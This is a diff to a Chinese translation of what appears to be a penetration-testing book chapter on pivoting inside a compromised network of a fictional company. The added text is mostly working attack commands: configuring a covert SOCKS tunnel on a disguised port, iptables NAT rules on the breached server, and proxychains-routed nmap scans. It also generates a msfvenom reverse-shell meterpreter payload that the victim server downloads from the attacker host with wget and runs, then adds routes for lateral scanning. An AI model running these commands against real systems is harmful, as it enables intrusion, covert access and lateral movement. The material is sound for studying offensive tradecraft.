@@ -174,6 +174,20 @@ frontGun$ wget https://raw.githubusercontent.com/mfontanini/Programs- Scripts/ma
 ```
 在编译之前，先将监听端口从 5555 改为一个不太明显的端口（比如 1521 端口），并对隧道连接设置账号密码。
 
+```
+40 #ifndef SERVER_PORT
+41     #define SERVER_PORT 1521
+42 #endif
+43 #define MAXPENDING 200
+44 #define BUF_SIZE 256
+45 #ifndef USERNAME
+46     #define USERNAME "username"
+47 #endif
+48 #ifndef PASSWORD
+49     #define PASSWORD "password"
+50 #endif
+
+```
 ![修改代码中的配置](./Chap3/3.3-2.png)
 
 在 FrontGun 服务器上编译该文件，然后启动一个轻量级的 HTTP 服务，方便一会儿从 SPH 公司的 linux 服务器上下载该程序。
@@ -194,10 +208,66 @@ FrontGun$ nc career.sph-assets.com 1521
 ```
 要想解决这个问题，我们在拿下的 Linux 服务器上创建两条本地规则，将所有来自我们 IP 的数据包都路由到 1521 端口：
 ```shell
-root@CAREER# iptables -t nat -A PREROUTING -s
-<IP_FrontGun> -p tcp -i eth1 -–dport 80 -j DNAT -–to- dest webserver02:1521
+root@CAREER# iptables -t nat -A PREROUTING -i eth2 -p tcp -s <IP_FrontGun>   --dport 80 -j DNAT --to-destination webserver02:1521
 root@CAREER# iptables -t nat -A POSTROUTING -d webserver02 -o eth1 -j MASQUERADE
 ```
-SPH 公司的这台 linux 服务器每次收到我们的 FrontGun 服务器 IP 发来的对80端口请求的数据包时，都会将其转发到 1521 端口。 Socks 代理将会解析我们的请求，然后根据我们的要求访问指定的内部服务器……干得漂亮！
+SPH 公司的这台 linux 服务器每次收到我们的 FrontGun 服务器 IP 发来的对 80 端口请求的数据包时，都会将其转发到 1521 端口。 Socks 代理将会解析我们的请求，然后根据我们的要求访问指定的内部服务器……干得漂亮！
 
+剩下要做的就是让 FrontGun 服务器上的所有工具都使用刚才创建的这条隧道。幸运的是，并不需要重写服务器上的所有脚本。通过 Kali 自带的 Proxychains（以下译作“代理链”）工具就能处理解决该问题。像下面这样修改 /etc/proxychains.conf 配置文件：
+```
+[ProxyList]
+61 # add proxy here ... 62 # meanwile
+63 # defaults set to "tor"
+64 #socks4	127.0.0.1 9050
+65 socks5	career.sph-assets.com 80
+```
+如果想通过proxychains 运行 nmap，只需要在 FrontGun 服务器运行以下命令：
+```
+FrontGun$ proxychains nmap -sT 192.168.1.0/24
+```
+
+{% hint style="info" %}
+提示： -sT 参数会强制 nmap 发起连接式扫描。否则流量不会经过代理链。
+{% endhint %}
+
+### 3.3.2 Meterpreter
+之前的 maneuver 依赖于 **iptables** 来创建本地转发规则，该工具仅适用于 root 用户。我们不可能一直都有这么高的权限，可能是因为时间不够、兴趣不够、或者缺少 exploit 等原因。
+
+出于完整性考虑，跟之前介绍隧道一样，我们详细看看 metasploit 的特性。首先，为 Linux 平台生成一个 meterpreter 执行文件，然后在 FrontGun 服务器创建一个监听器。
+```
+FrontGun$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=FrontGun_IP LPORT=443 -f elf > package
+
+FrontGun$ msfconsole
+Msf> use exploit/multi/handler
+Msf> set payload linux/x86/meterpreter/reverse_tcp Msf> set LHOST FRONTGUN_IP
+Msf> set LPORT 443 Msf> run
+```
+接下来在 FrontGun 启动一个 HTTP 服务，从先前拿下的 Linux 服务器上下载该 meterpreter 文件并执行：
+```
+FrontGun$ python -m SimpleHTTPServer 80
+# 以下在蓝区的 Linux 服务器执行
+Career# wget http://FrontGun/package
+Career# chmod +x package && ./package
+```
+很快，在 FrontGun 服务器的屏幕上就弹出了 meterpreter 会话。 通过该会话，不仅可以将命令转发到已经拿下的服务器，还可以发到 DMZ 区的所有服务器。
+
+要实现这一点，只需要告诉 metasploit 的模块，将所有命令通过这个 meterpreter 会话发送，同时给这个会话号（本例中是1）增加一条路由：
+```
+meterpreter > (press Ctr+z) Background session 1? [y/N]
+msf exploit(handler) > route add 192.168.1.0 255.255.255.0 1
+[*] Route added
+```
+通过内部的 metasploit 扫描器快速测试一下，确认该路由工作正常：
+```
+msf exploit(handler) > use auxiliary/scanner/portscan/tcp 
+msf auxiliary(tcp) > set PORTS 80
+PORTS => 80
+msf auxiliary(tcp) > set RHOSTS 192.168.1.46
+RHOSTS => 192.168.1.46
+msf auxiliary(tcp) > run
+
+[*] 192.168.1.46:80 - TCP OPEN
+[*] Auxiliary module execution completed
+```
+stop at P25
 
